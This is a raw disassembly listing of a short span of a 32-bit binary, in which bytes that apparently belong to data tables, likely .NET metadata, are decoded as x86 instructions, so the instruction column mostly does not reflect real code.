  40633b:	00 86 00 5b 0c 95    	add    %al,-0x6af3a500(%esi)
  406341:	01 33                	add    %esi,(%ebx)
  406343:	00 ca                	add    %cl,%dl
  406345:	23 00                	and    (%eax),%eax
  406347:	00 00                	add    %al,(%eax)
  406349:	00 86 00 0f 10 99    	add    %al,-0x66eff100(%esi)
  40634f:	01 33                	add    %esi,(%ebx)
  406351:	00 df                	add    %bl,%bh
  406353:	23 00                	and    (%eax),%eax
  406355:	00 00                	add    %al,(%eax)
  406357:	00 86 00 14 06 9e    	add    %al,-0x61f9ec00(%esi)
  40635d:	01 34 00             	add    %esi,(%eax,%eax,1)
  406360:	f5                   	cmc
  406361:	23 00                	and    (%eax),%eax
  406363:	00 00                	add    %al,(%eax)
  406365:	00 86 00 c3 18 a3    	add    %al,-0x5ce73d00(%esi)
  40636b:	01 35 00 a8 36 00    	add    %esi,0x36a800
  406371:	00 00                	add    %al,(%eax)
  406373:	00 86 00 16 16 79    	add    %al,0x79161600(%esi)
  406379:	01 36                	add    %esi,(%esi)
  40637b:	00 fc                	add    %bh,%ah
  40637d:	36 00 00             	add    %al,%ss:(%eax)
  406380:	00 00                	add    %al,(%eax)
  406382:	86 00                	xchg   %al,(%eax)
  406384:	2c 06                	sub    $0x6,%al
  406386:	53                   	push   %ebx
  406387:	01 37                	add    %esi,(%edi)
  406389:	00 20                	add    %ah,(%eax)
  40638b:	37                   	aaa
  40638c:	00 00                	add    %al,(%eax)
  40638e:	00 00                	add    %al,(%eax)
  406390:	86 00                	xchg   %al,(%eax)
  406392:	27                   	daa
  406393:	0f 5d 01             	minps  (%ecx),%xmm0
  406396:	38 00                	cmp    %al,(%eax)
  406398:	b0 3c                	mov    $0x3c,%al
  40639a:	00 00                	add    %al,(%eax)
  40639c:	00 00                	add    %al,(%eax)
  40639e:	86 00                	xchg   %al,(%eax)
  4063a0:	d2 15 7f 01 39 00    	rclb   %cl,0x39017f
  4063a6:	14 3d                	adc    $0x3d,%al
  4063a8:	00 00                	add    %al,(%eax)
  4063aa:	00 00                	add    %al,(%eax)
  4063ac:	86 00                	xchg   %al,(%eax)
  4063ae:	f6 0e 5d             	testb  $0x5d,(%esi)
  4063b1:	01 39                	add    %edi,(%ecx)
  4063b3:	00 0a                	add    %cl,(%edx)
  4063b5:	24 00                	and    $0x0,%al
  4063b7:	00 00                	add    %al,(%eax)
  4063b9:	00 86 08 33 0c 95    	add    %al,-0x6af3ccf8(%esi)
  4063bf:	01 3a                	add    %edi,(%edx)
  4063c1:	00 12                	add    %dl,(%edx)
  4063c3:	24 00                	and    $0x0,%al
  4063c5:	00 00                	add    %al,(%eax)
  4063c7:	00 86 08 40 0c 53    	add    %al,0x530c4008(%esi)
  4063cd:	01 3a                	add    %edi,(%edx)
  4063cf:	00 1b                	add    %bl,(%ebx)
  4063d1:	24 00                	and    $0x0,%al
  4063d3:	00 00                	add    %al,(%eax)
  4063d5:	00 86 08 4d 13 71    	add    %al,0x71134d08(%esi)
  4063db:	01 3b                	add    %edi,(%ebx)
  4063dd:	00 23                	add    %ah,(%ebx)
  4063df:	24 00                	and    $0x0,%al
  4063e1:	00 00                	add    %al,(%eax)
  4063e3:	00 86 08 5b 13 63    	add    %al,0x63135b08(%esi)
  4063e9:	01 3b                	add    %edi,(%ebx)
  4063eb:	00 2c 24             	add    %ch,(%esp)
  4063ee:	00 00                	add    %al,(%eax)
  4063f0:	00 00                	add    %al,(%eax)
  4063f2:	86 08                	xchg   %cl,(%eax)
  4063f4:	a0 18 75 01 3c       	mov    0x3c017518,%al
  4063f9:	00 34 24             	add    %dh,(%esp)
  4063fc:	00 00                	add    %al,(%eax)
  4063fe:	00 00                	add    %al,(%eax)
  406400:	86 08                	xchg   %cl,(%eax)
  406402:	ac                   	lods   %ds:(%esi),%al
  406403:	18 a3 01 3c 00 0c    	sbb    %ah,0xc003c01(%ebx)
  406409:	3e 00 00             	add    %al,%ds:(%eax)
  40640c:	00 00                	add    %al,(%eax)
  40640e:	86 08                	xchg   %cl,(%eax)
  406410:	1e                   	push   %ds
  406411:	1c a8                	sbb    $0xa8,%al
  406413:	01 3d 00 3d 24 00    	add    %edi,0x243d00
  406419:	00 00                	add    %al,(%eax)
  40641b:	00 86 08 bf 07 ad    	add    %al,-0x52f840f8(%esi)
  406421:	01 3d 00 45 24 00    	add    %edi,0x244500
  406427:	00 00                	add    %al,(%eax)
  406429:	00 e1                	add    %ah,%cl
  40642b:	01 71 14             	add    %esi,0x14(%ecx)
  40642e:	b2 01                	mov    $0x1,%dl
  406430:	3d 00 52 24 00       	cmp    $0x245200,%eax
  406435:	00 00                	add    %al,(%eax)
  406437:	00 86 18 a8 14 0e    	add    %al,0xe14a818(%esi)
  40643d:	00 3d 00 64 3e 00    	add    %bh,0x3e6400
  406443:	00 00                	add    %al,(%eax)
  406445:	00 96 00 04 0c 09    	add    %dl,0x90c0400(%esi)
  40644b:	02 3d 00 65 24 00    	add    0x246500,%bh
  406451:	00 00                	add    %al,(%eax)
  406453:	00 96 00 04 0c 10    	add    %dl,0x100c0400(%esi)
  406459:	02 3f                	add    (%edi),%bh
  40645b:	00 88 3e 00 00 00    	add    %cl,0x3e(%eax)
  406461:	00 96 00 04 0c 16    	add    %dl,0x160c0400(%esi)
  406467:	02 40 00             	add    0x0(%eax),%al
  40646a:	78 20                	js     0x40648c
  40646c:	00 00                	add    %al,(%eax)
  40646e:	00 00                	add    %al,(%eax)
  406470:	86 18                	xchg   %bl,(%eax)
  406472:	a8 14                	test   $0x14,%al
  406474:	0e                   	push   %cs
  406475:	00 42 00             	add    %al,0x0(%edx)
  406478:	74 24                	je     0x40649e
  40647a:	00 00                	add    %al,(%eax)
  40647c:	00 00                	add    %al,(%eax)
  40647e:	96                   	xchg   %eax,%esi
  40647f:	00 d5                	add    %dl,%ch
  406481:	0e                   	push   %cs
  406482:	1d 02 42 00 30       	sbb    $0x30004202,%eax
  406487:	3f                   	aas
  406488:	00 00                	add    %al,(%eax)
  40648a:	00 00                	add    %al,(%eax)
  40648c:	96                   	xchg   %eax,%esi
  40648d:	00 1e                	add    %bl,(%esi)
  40648f:	0c 23                	or     $0x23,%al
  406491:	02 43 00             	add    0x0(%ebx),%al
  406494:	e4 3f                	in     $0x3f,%al
  406496:	00 00                	add    %al,(%eax)
  406498:	00 00                	add    %al,(%eax)
  40649a:	96                   	xchg   %eax,%esi
  40649b:	00 da                	add    %bl,%dl
  40649d:	1c 2a                	sbb    $0x2a,%al
  40649f:	02 45 00             	add    0x0(%ebp),%al
  4064a2:	81 24 00 00 00 00 96 	andl   $0x96000000,(%eax,%eax,1)
  4064a9:	00 95 18 32 02 47    	add    %dl,0x47023218(%ebp)
  4064af:	00 9c 24 00 00 00 00 	add    %bl,0x0(%esp)
  4064b6:	96                   	xchg   %eax,%esi
  4064b7:	00 ff                	add    %bh,%bh
  4064b9:	05 39 02 49 00       	add    $0x490239,%eax
  4064be:	bc 24 00 00 00       	mov    $0x24,%esp
  4064c3:	00 96 00 f8 0f 40    	add    %dl,0x400ff800(%esi)
  4064c9:	02 4b 00             	add    0x0(%ebx),%cl
  4064cc:	78 40                	js     0x40650e
  4064ce:	00 00                	add    %al,(%eax)
  4064d0:	00 00                	add    %al,(%eax)
  4064d2:	96                   	xchg   %eax,%esi
  4064d3:	00 a1 00 47 02 4d    	add    %ah,0x4d024700(%ecx)
  4064d9:	00 a8 40 00 00 00    	add    %ch,0x40(%eax)
  4064df:	00 96 00 40 13 4e    	add    %dl,0x4e134000(%esi)
  4064e5:	02 4f 00             	add    0x0(%edi),%cl
  4064e8:	78 20                	js     0x40650a
  4064ea:	00 00                	add    %al,(%eax)
  4064ec:	00 00                	add    %al,(%eax)
  4064ee:	86 18                	xchg   %bl,(%eax)
  4064f0:	a8 14                	test   $0x14,%al
  4064f2:	0e                   	push   %cs
  4064f3:	00 51 00             	add    %dl,0x0(%ecx)
  4064f6:	d4 41                	aam    $0x41
  4064f8:	00 00                	add    %al,(%eax)
  4064fa:	00 00                	add    %al,(%eax)
  4064fc:	96                   	xchg   %eax,%esi
  4064fd:	00 ac 0e 0a 00 51 00 	add    %ch,0x51000a(%esi,%ecx,1)
  406504:	78 20                	js     0x406526
  406506:	00 00                	add    %al,(%eax)
  406508:	00 00                	add    %al,(%eax)
  40650a:	86 18                	xchg   %bl,(%eax)
  40650c:	a8 14                	test   $0x14,%al
  40650e:	0e                   	push   %cs
  40650f:	00 51 00             	add    %dl,0x0(%ecx)
  406512:	d8 24 00             	fsubs  (%eax,%eax,1)
  406515:	00 00                	add    %al,(%eax)
  406517:	00 96 00 ea 16 0a    	add    %dl,0xa16ea00(%esi)
  40651d:	00 51 00             	add    %dl,0x0(%ecx)
  406520:	00 45 00             	add    %al,0x0(%ebp)
  406523:	00 00                	add    %al,(%eax)
  406525:	00 91 00 fb 0d 1d    	add    %dl,0x1d0dfb00(%ecx)
  40652b:	00 51 00             	add    %dl,0x0(%ecx)
  40652e:	4c                   	dec    %esp
  40652f:	45                   	inc    %ebp
  406530:	00 00                	add    %al,(%eax)
  406532:	00 00                	add    %al,(%eax)
  406534:	91                   	xchg   %eax,%ecx
  406535:	00 57 02             	add    %dl,0x2(%edi)
  406538:	1d 00 51 00 90       	sbb    $0x90005100,%eax
  40653d:	45                   	inc    %ebp
  40653e:	00 00                	add    %al,(%eax)
  406540:	00 00                	add    %al,(%eax)
  406542:	91                   	xchg   %eax,%ecx
  406543:	00 f2                	add    %dh,%dl
  406545:	13 1d 00 51 00 a0    	adc    0xa0005100,%ebx
  40654b:	46                   	inc    %esi
  40654c:	00 00                	add    %al,(%eax)
  40654e:	00 00                	add    %al,(%eax)
  406550:	91                   	xchg   %eax,%ecx
  406551:	00 83 13 1d 00 51    	add    %al,0x51001d13(%ebx)
  406557:	00 dc                	add    %bl,%ah
  406559:	46                   	inc    %esi
  40655a:	00 00                	add    %al,(%eax)
  40655c:	00 00                	add    %al,(%eax)
  40655e:	91                   	xchg   %eax,%ecx
  40655f:	00 5f 05             	add    %bl,0x5(%edi)
  406562:	1d 00 51 00 00       	sbb    $0x5100,%eax
  406567:	00 00                	add    %al,(%eax)
  406569:	00 80 00 96 20 c0    	add    %al,-0x3fdf6a00(%eax)
  40656f:	05 55 02 51 00       	add    $0x510255,%eax
  406574:	00 00                	add    %al,(%eax)
  406576:	00 00                	add    %al,(%eax)
  406578:	80 00 91             	addb   $0x91,(%eax)
  40657b:	20 cd                	and    %cl,%ch
  40657d:	1a 5a 02             	sbb    0x2(%edx),%bl
  406580:	52                   	push   %edx
  406581:	00 78 20             	add    %bh,0x20(%eax)
  406584:	00 00                	add    %al,(%eax)
  406586:	00 00                	add    %al,(%eax)
  406588:	86 18                	xchg   %bl,(%eax)
  40658a:	a8 14                	test   $0x14,%al
  40658c:	0e                   	push   %cs
  40658d:	00 54 00 1c          	add    %dl,0x1c(%eax,%eax,1)
  406591:	47                   	inc    %edi
  406592:	00 00                	add    %al,(%eax)
  406594:	00 00                	add    %al,(%eax)
  406596:	86 00                	xchg   %al,(%eax)
  406598:	ed                   	in     (%dx),%eax
  406599:	17                   	pop    %ss
  40659a:	95                   	xchg   %eax,%ebp
  40659b:	01 54 00 a0          	add    %edx,-0x60(%eax,%eax,1)
  40659f:	47                   	inc    %edi
  4065a0:	00 00                	add    %al,(%eax)
  4065a2:	00 00                	add    %al,(%eax)
  4065a4:	86 00                	xchg   %al,(%eax)
  4065a6:	8e 07                	mov    (%edi),%es
  4065a8:	61                   	popa
  4065a9:	02 54 00 78          	add    0x78(%eax,%eax,1),%dl
  4065ad:	20 00                	and    %al,(%eax)
  4065af:	00 00                	add    %al,(%eax)
  4065b1:	00 86 18 a8 14 0e    	add    %al,0xe14a818(%esi)
  4065b7:	00 55 00             	add    %dl,0x0(%ebp)
  4065ba:	44                   	inc    %esp
  4065bb:	48                   	dec    %eax
  4065bc:	00 00                	add    %al,(%eax)
  4065be:	00 00                	add    %al,(%eax)
  4065c0:	96                   	xchg   %eax,%esi
  4065c1:	00 e0                	add    %ah,%al
  4065c3:	01 67 02             	add    %esp,0x2(%edi)
  4065c6:	55                   	push   %ebp
  4065c7:	00 c0                	add    %al,%al
  4065c9:	48                   	dec    %eax
  4065ca:	00 00                	add    %al,(%eax)
  4065cc:	00 00                	add    %al,(%eax)
  4065ce:	96                   	xchg   %eax,%esi
  4065cf:	00 d6                	add    %dl,%dh
  4065d1:	0c 6b                	or     $0x6b,%al
  4065d3:	02 55 00             	add    0x0(%ebp),%dl
  4065d6:	28 49 00             	sub    %cl,0x0(%ecx)
  4065d9:	00 00                	add    %al,(%eax)
  4065db:	00 96 00 a8 11 53    	add    %dl,0x5311a800(%esi)
  4065e1:	00 56 00             	add    %dl,0x0(%esi)
  4065e4:	03 25 00 00 00 00    	add    0x0,%esp
  4065ea:	96                   	xchg   %eax,%esi
  4065eb:	00 6b 10             	add    %ch,0x10(%ebx)
  4065ee:	1d 00 56 00 e8       	sbb    $0xe8005600,%eax
  4065f3:	4a                   	dec    %edx
  4065f4:	00 00                	add    %al,(%eax)
  4065f6:	00 00                	add    %al,(%eax)
  4065f8:	96                   	xchg   %eax,%esi
  4065f9:	00 a5 19 0a 00 56    	add    %ah,0x56000a19(%ebp)
  4065ff:	00 48 4b             	add    %cl,0x4b(%eax)
  406602:	00 00                	add    %al,(%eax)
  406604:	00 00                	add    %al,(%eax)
  406606:	96                   	xchg   %eax,%esi
  406607:	00 71 18             	add    %dh,0x18(%ecx)
  40660a:	67 02 56 00          	add    0x0(%bp),%dl
  40660e:	1c 4c                	sbb    $0x4c,%al
  406610:	00 00                	add    %al,(%eax)
  406612:	00 00                	add    %al,(%eax)
  406614:	96                   	xchg   %eax,%esi
  406615:	00 1f                	add    %bl,(%edi)
  406617:	13 79 02             	adc    0x2(%ecx),%edi
  40661a:	56                   	push   %esi
  40661b:	00 00                	add    %al,(%eax)
  40661d:	00 00                	add    %al,(%eax)
  40661f:	00 80 00 96 20 85    	add    %al,-0x7adf6a00(%eax)
  406625:	08 80 02 57 00 58    	or     %al,0x58005702(%eax)
  40662b:	4c                   	dec    %esp
  40662c:	00 00                	add    %al,(%eax)
  40662e:	00 00                	add    %al,(%eax)
  406630:	96                   	xchg   %eax,%esi
  406631:	00 1b                	add    %bl,(%ebx)
  406633:	12 0a                	adc    (%edx),%cl
  406635:	00 58 00             	add    %bl,0x0(%eax)
  406638:	88 4c 00 00          	mov    %cl,0x0(%eax,%eax,1)
  40663c:	00 00                	add    %al,(%eax)
  40663e:	96                   	xchg   %eax,%esi
  40663f:	00 dc                	add    %bl,%ah
  406641:	1b 1d 00 58 00 19    	sbb    0x19005800,%ebx
  406647:	25 00 00 00 00       	and    $0x0,%eax
  40664c:	96                   	xchg   %eax,%esi
  40664d:	00 d1                	add    %dl,%cl
  40664f:	1b 0a                	sbb    (%edx),%ecx
  406651:	00 58 00             	add    %bl,0x0(%eax)
  406654:	32 25 00 00 00 00    	xor    0x0,%ah
  40665a:	96                   	xchg   %eax,%esi
  40665b:	00 8b 0b 97 02 58    	add    %cl,0x5802970b(%ebx)
  406661:	00 a8 4c 00 00 00    	add    %ch,0x4c(%eax)
  406667:	00 96 00 27 19 0a    	add    %dl,0xa192700(%esi)
  40666d:	00 5a 00             	add    %bl,0x0(%edx)
  406670:	e8 4c 00 00 00       	call   0x4066c1
  406675:	00 96 00 ab 19 0a    	add    %dl,0xa19ab00(%esi)
  40667b:	00 5a 00             	add    %bl,0x0(%edx)
  40667e:	00 00                	add    %al,(%eax)
  406680:	00 00                	add    %al,(%eax)
  406682:	80 00 91             	addb   $0x91,(%eax)
  406685:	20 1d 0e 9e 02 5a    	and    %bl,0x5a029e0e
  40668b:	00 1c 4d 00 00 00 00 	add    %bl,0x0(,%ecx,2)
  406692:	96                   	xchg   %eax,%esi
  406693:	00 83 0a a5 02 5d    	add    %al,0x5d02a50a(%ebx)
  406699:	00 7c 4d 00          	add    %bh,0x0(%ebp,%ecx,2)
  40669d:	00 00                	add    %al,(%eax)
  40669f:	00 96 00 7a 0a 6b    	add    %dl,0x6b0a7a00(%esi)
  4066a5:	02 5f 00             	add    0x0(%edi),%bl
  4066a8:	e0 4d                	loopne 0x4066f7
  4066aa:	00 00                	add    %al,(%eax)
  4066ac:	00 00                	add    %al,(%eax)
  4066ae:	96                   	xchg   %eax,%esi
  4066af:	00 63 0a             	add    %ah,0xa(%ebx)
  4066b2:	84 00                	test   %al,(%eax)
  4066b4:	60                   	pusha
  4066b5:	00 40 4e             	add    %al,0x4e(%eax)
  4066b8:	00 00                	add    %al,(%eax)
  4066ba:	00 00                	add    %al,(%eax)
  4066bc:	96                   	xchg   %eax,%esi
  4066bd:	00 52 1c             	add    %dl,0x1c(%edx)
  4066c0:	1d 00 61 00 4c       	sbb    $0x4c006100,%eax
  4066c5:	25 00 00 00 00       	and    $0x0,%eax
  4066ca:	91                   	xchg   %eax,%ecx
  4066cb:	18 ae 14 0a 00 61    	sbb    %ch,0x61000a14(%esi)
  4066d1:	00 a4 4e 00 00 00 00 	add    %ah,0x0(%esi,%ecx,2)
  4066d8:	96                   	xchg   %eax,%esi
  4066d9:	00 09                	add    %cl,(%ecx)
  4066db:	03 9a 00 61 00 c0    	add    -0x3fff9f00(%edx),%ebx
  4066e1:	50                   	push   %eax
  4066e2:	00 00                	add    %al,(%eax)
  4066e4:	00 00                	add    %al,(%eax)
  4066e6:	91                   	xchg   %eax,%ecx
  4066e7:	00 6f 05             	add    %ch,0x5(%edi)
  4066ea:	ab                   	stos   %eax,%es:(%edi)
  4066eb:	02 62 00             	add    0x0(%edx),%ah
  4066ee:	62 25 00 00 00 00    	bound  %esp,0x0
  4066f4:	91                   	xchg   %eax,%ecx
  4066f5:	00 5f 03             	add    %bl,0x3(%edi)
  4066f8:	0a 00                	or     (%eax),%al
  4066fa:	63 00                	arpl   %eax,(%eax)
  4066fc:	92                   	xchg   %eax,%edx
  4066fd:	25 00 00 00 00       	and    $0x0,%eax
  406702:	96                   	xchg   %eax,%esi
  406703:	00 44 14 b1          	add    %al,-0x4f(%esp,%edx,1)
  406707:	02 63 00             	add    0x0(%ebx),%ah
  40670a:	c9                   	leave
  40670b:	25 00 00 00 00       	and    $0x0,%eax
  406710:	91                   	xchg   %eax,%ecx
  406711:	18 ae 14 0a 00 64    	sbb    %ch,0x64000a14(%esi)
  406717:	00 e8                	add    %ch,%al
  406719:	51                   	push   %ecx
  40671a:	00 00                	add    %al,(%eax)
  40671c:	00 00                	add    %al,(%eax)
  40671e:	86 18                	xchg   %bl,(%eax)
  406720:	a8 14                	test   $0x14,%al
  406722:	53                   	push   %ebx
  406723:	01 64 00 d5          	add    %esp,-0x2b(%eax,%eax,1)
  406727:	25 00 00 00 00       	and    $0x0,%eax
  40672c:	86 00                	xchg   %al,(%eax)
  40672e:	3e 1b de             	ds sbb %esi,%ebx
  406731:	02 65 00             	add    0x0(%ebp),%ah
  406734:	58                   	pop    %eax
  406735:	52                   	push   %edx
  406736:	00 00                	add    %al,(%eax)
  406738:	00 00                	add    %al,(%eax)
  40673a:	86 00                	xchg   %al,(%eax)
  40673c:	3e 1b e3             	ds sbb %ebx,%esp
  40673f:	02 66 00             	add    0x0(%esi),%ah
  406742:	ed                   	in     (%dx),%eax
  406743:	25 00 00 00 00       	and    $0x0,%eax
  406748:	86 00                	xchg   %al,(%eax)
  40674a:	36 1b de             	ss sbb %esi,%ebx
  40674d:	02 67 00             	add    0x0(%edi),%ah
  406750:	98                   	cwtl
  406751:	53                   	push   %ebx
  406752:	00 00                	add    %al,(%eax)
  406754:	00 00                	add    %al,(%eax)
  406756:	86 00                	xchg   %al,(%eax)
  406758:	36 1b e3             	ss sbb %ebx,%esp
  40675b:	02 68 00             	add    0x0(%eax),%ch
  40675e:	40                   	inc    %eax
  40675f:	55                   	push   %ebp
  406760:	00 00                	add    %al,(%eax)
  406762:	48                   	dec    %eax
  406763:	00 81 00 82 0e ea    	add    %al,-0x15f17e00(%ecx)
  406769:	02 69 00             	add    0x0(%ecx),%ch
  40676c:	05 26 00 00 00       	add    $0x26,%eax
  406771:	00 91 18 ae 14 0a    	add    %dl,0xa14ae18(%ecx)
  406777:	00 6b 00             	add    %ch,0x0(%ebx)
  40677a:	68 55 00 00 00       	push   $0x55
  40677f:	00 96 00 c0 0c 6b    	add    %dl,0x6b0cc000(%esi)
  406785:	02 6b 00             	add    0x0(%ebx),%ch
  406788:	ec                   	in     (%dx),%al
  406789:	55                   	push   %ebp
  40678a:	00 00                	add    %al,(%eax)
  40678c:	00 00                	add    %al,(%eax)
  40678e:	96                   	xchg   %eax,%esi
  40678f:	00 c0                	add    %al,%al
  406791:	0c d3                	or     $0xd3,%al
  406793:	00 6c 00 24          	add    %ch,0x24(%eax,%eax,1)
  406797:	56                   	push   %esi
  406798:	00 00                	add    %al,(%eax)
  40679a:	00 00                	add    %al,(%eax)
  40679c:	96                   	xchg   %eax,%esi
  40679d:	00 25 18 d3 00 6d    	add    %ah,0x6d00d318
  4067a3:	00 a4 56 00 00 00 00 	add    %ah,0x0(%esi,%edx,2)
  4067aa:	96                   	xchg   %eax,%esi
  4067ab:	00 1c 18             	add    %bl,(%eax,%ebx,1)
  4067ae:	d3 00                	roll   %cl,(%eax)
  4067b0:	6e                   	outsb  %ds:(%esi),(%dx)
  4067b1:	00 00                	add    %al,(%eax)
  4067b3:	00 01                	add    %al,(%ecx)
  4067b5:	00 8c 0a 00 00 01 00 	add    %cl,0x10000(%edx,%ecx,1)
  4067bc:	8c 0a                	mov    %cs,(%edx)
  4067be:	00 00                	add    %al,(%eax)
  4067c0:	01 00                	add    %eax,(%eax)
  4067c2:	8c 0a                	mov    %cs,(%edx)
  4067c4:	00 00                	add    %al,(%eax)
  4067c6:	01 00                	add    %eax,(%eax)
  4067c8:	8c 0a                	mov    %cs,(%edx)
  4067ca:	00 00                	add    %al,(%eax)
  4067cc:	01 00                	add    %eax,(%eax)
  4067ce:	8c 0a                	mov    %cs,(%edx)
  4067d0:	00 00                	add    %al,(%eax)
  4067d2:	01 00                	add    %eax,(%eax)
  4067d4:	8c 0a                	mov    %cs,(%edx)
  4067d6:	00 00                	add    %al,(%eax)
  4067d8:	01 00                	add    %eax,(%eax)
  4067da:	8c 0a                	mov    %cs,(%edx)
  4067dc:	00 00                	add    %al,(%eax)
  4067de:	01 00                	add    %eax,(%eax)
  4067e0:	8c 0a                	mov    %cs,(%edx)
  4067e2:	00 00                	add    %al,(%eax)
  4067e4:	01 00                	add    %eax,(%eax)
  4067e6:	8c 0a                	mov    %cs,(%edx)
  4067e8:	00 00                	add    %al,(%eax)
  4067ea:	01 00                	add    %eax,(%eax)
  4067ec:	5e                   	pop    %esi
  4067ed:	07                   	pop    %es
  4067ee:	00 00                	add    %al,(%eax)
  4067f0:	01 00                	add    %eax,(%eax)
  4067f2:	ea 12 00 00 02 00 72 	ljmp   $0x7200,$0x2000012
  4067f9:	08 00                	or     %al,(%eax)
  4067fb:	00 03                	add    %al,(%ebx)
  4067fd:	00 40 10             	add    %al,0x10(%eax)
  406800:	00 00                	add    %al,(%eax)
  406802:	04 00                	add    $0x0,%al
  406804:	c9                   	leave
  406805:	17                   	pop    %ss
  406806:	00 00                	add    %al,(%eax)
  406808:	01 00                	add    %eax,(%eax)
  40680a:	6a 12                	push   $0x12
  40680c:	00 00                	add    %al,(%eax)
  40680e:	01 00                	add    %eax,(%eax)
  406810:	bc 0c 00 00 01       	mov    $0x100000c,%esp
  406815:	00 62 0d             	add    %ah,0xd(%edx)
  406818:	00 00                	add    %al,(%eax)
  40681a:	01 00                	add    %eax,(%eax)
  40681c:	62 0d 00 00 01 00    	bound  %ecx,0x10000
  406822:	79 18                	jns    0x40683c
  406824:	00 00                	add    %al,(%eax)
  406826:	01 00                	add    %eax,(%eax)
  406828:	ec                   	in     (%dx),%al
  406829:	15 00 00 01 00       	adc    $0x10000,%eax
  40682e:	72 16                	jb     0x406846
  406830:	00 00                	add    %al,(%eax)
  406832:	01 00                	add    %eax,(%eax)
  406834:	72 16                	jb     0x40684c
  406836:	00 00                	add    %al,(%eax)
  406838:	01 00                	add    %eax,(%eax)
  40683a:	b6 1b                	mov    $0x1b,%dh
  40683c:	00 00                	add    %al,(%eax)
  40683e:	01 00                	add    %eax,(%eax)
  406840:	b6 1b                	mov    $0x1b,%dh
  406842:	00 00                	add    %al,(%eax)
  406844:	01 00                	add    %eax,(%eax)
  406846:	b6 1b                	mov    $0x1b,%dh
  406848:	00 00                	add    %al,(%eax)
  40684a:	01 00                	add    %eax,(%eax)
  40684c:	b6 1b                	mov    $0x1b,%dh
  40684e:	00 00                	add    %al,(%eax)
  406850:	01 00                	add    %eax,(%eax)
  406852:	b6 1b                	mov    $0x1b,%dh
  406854:	00 00                	add    %al,(%eax)
  406856:	01 00                	add    %eax,(%eax)
  406858:	62 0d 00 00 01 00    	bound  %ecx,0x10000
  40685e:	4f                   	dec    %edi
  40685f:	0d 00 00 02 00       	or     $0x20000,%eax
  406864:	5a                   	pop    %edx
  406865:	0d 00 00 01 00       	or     $0x10000,%eax
  40686a:	8c 0a                	mov    %cs,(%edx)
  40686c:	00 00                	add    %al,(%eax)
  40686e:	01 00                	add    %eax,(%eax)
  406870:	8c 0a                	mov    %cs,(%edx)
  406872:	00 00                	add    %al,(%eax)
  406874:	01 00                	add    %eax,(%eax)
  406876:	8c 0a                	mov    %cs,(%edx)
  406878:	00 00                	add    %al,(%eax)
  40687a:	01 00                	add    %eax,(%eax)
  40687c:	cb                   	lret
  40687d:	1b 00                	sbb    (%eax),%eax
  40687f:	00 01                	add    %al,(%ecx)
  406881:	00 8c 0a 00 00 01 00 	add    %cl,0x10000(%edx,%ecx,1)
  406888:	5e                   	pop    %esi
  406889:	07                   	pop    %es
  40688a:	00 00                	add    %al,(%eax)
  40688c:	01 00                	add    %eax,(%eax)
  40688e:	5e                   	pop    %esi
  40688f:	07                   	pop    %es
  406890:	00 00                	add    %al,(%eax)
  406892:	01 00                	add    %eax,(%eax)
  406894:	63 17                	arpl   %edx,(%edi)
  406896:	00 00                	add    %al,(%eax)
  406898:	01 00                	add    %eax,(%eax)
  40689a:	63 17                	arpl   %edx,(%edi)
  40689c:	00 00                	add    %al,(%eax)
  40689e:	01 00                	add    %eax,(%eax)
  4068a0:	8c 0a                	mov    %cs,(%edx)
  4068a2:	00 00                	add    %al,(%eax)
  4068a4:	01 00                	add    %eax,(%eax)
  4068a6:	8c 0a                	mov    %cs,(%edx)
  4068a8:	00 00                	add    %al,(%eax)
  4068aa:	01 00                	add    %eax,(%eax)
  4068ac:	8c 0a                	mov    %cs,(%edx)
  4068ae:	00 00                	add    %al,(%eax)
  4068b0:	01 00                	add    %eax,(%eax)
  4068b2:	98                   	cwtl
  4068b3:	1c 00                	sbb    $0x0,%al
  4068b5:	00 02                	add    %al,(%edx)
  4068b7:	00 8c 0a 00 00 01 00 	add    %cl,0x10000(%edx,%ecx,1)
  4068be:	98                   	cwtl
  4068bf:	1c 00                	sbb    $0x0,%al
  4068c1:	00 02                	add    %al,(%edx)
  4068c3:	00 8c 0a 00 00 01 00 	add    %cl,0x10000(%edx,%ecx,1)
  4068ca:	dd 06                	fldl   (%esi)
  4068cc:	00 00                	add    %al,(%eax)
  4068ce:	01 00                	add    %eax,(%eax)
  4068d0:	dd 06                	fldl   (%esi)
  4068d2:	00 00                	add    %al,(%eax)
  4068d4:	01 00                	add    %eax,(%eax)
  4068d6:	0e                   	push   %cs
  4068d7:	0d 00 00 01 00       	or     $0x10000,%eax
  4068dc:	8c 0a                	mov    %cs,(%edx)
  4068de:	00 00                	add    %al,(%eax)
  4068e0:	01 00                	add    %eax,(%eax)
  4068e2:	07                   	pop    %es
  4068e3:	0e                   	push   %cs
  4068e4:	00 00                	add    %al,(%eax)
  4068e6:	01 00                	add    %eax,(%eax)
  4068e8:	0c 0e                	or     $0xe,%al
  4068ea:	00 00                	add    %al,(%eax)
  4068ec:	01 00                	add    %eax,(%eax)
  4068ee:	0c 0e                	or     $0xe,%al
  4068f0:	00 00                	add    %al,(%eax)
  4068f2:	01 00                	add    %eax,(%eax)
  4068f4:	72 16                	jb     0x40690c
  4068f6:	00 00                	add    %al,(%eax)
  4068f8:	01 00                	add    %eax,(%eax)
  4068fa:	dd 06                	fldl   (%esi)
  4068fc:	00 00                	add    %al,(%eax)
  4068fe:	01 00                	add    %eax,(%eax)
  406900:	63 17                	arpl   %edx,(%edi)
  406902:	00 00                	add    %al,(%eax)
  406904:	01 00                	add    %eax,(%eax)
  406906:	63 17                	arpl   %edx,(%edi)
  406908:	00 00                	add    %al,(%eax)
  40690a:	01 00                	add    %eax,(%eax)
  40690c:	8c 0a                	mov    %cs,(%edx)
  40690e:	00 00                	add    %al,(%eax)
  406910:	01 00                	add    %eax,(%eax)
  406912:	8c 0a                	mov    %cs,(%edx)
  406914:	00 00                	add    %al,(%eax)
  406916:	01 00                	add    %eax,(%eax)
  406918:	8c 0a                	mov    %cs,(%edx)
  40691a:	00 00                	add    %al,(%eax)
  40691c:	01 00                	add    %eax,(%eax)
  40691e:	63 17                	arpl   %edx,(%edi)
  406920:	00 00                	add    %al,(%eax)
  406922:	02 00                	add    (%eax),%al
  406924:	24 10                	and    $0x10,%al
  406926:	00 00                	add    %al,(%eax)
  406928:	01 00                	add    %eax,(%eax)
  40692a:	63 17                	arpl   %edx,(%edi)
  40692c:	00 00                	add    %al,(%eax)
  40692e:	01 00                	add    %eax,(%eax)
  406930:	35 0b 00 00 02       	xor    $0x200000b,%eax
  406935:	00 63 17             	add    %ah,0x17(%ebx)
  406938:	00 00                	add    %al,(%eax)
  40693a:	01 00                	add    %eax,(%eax)
  40693c:	63 17                	arpl   %edx,(%edi)
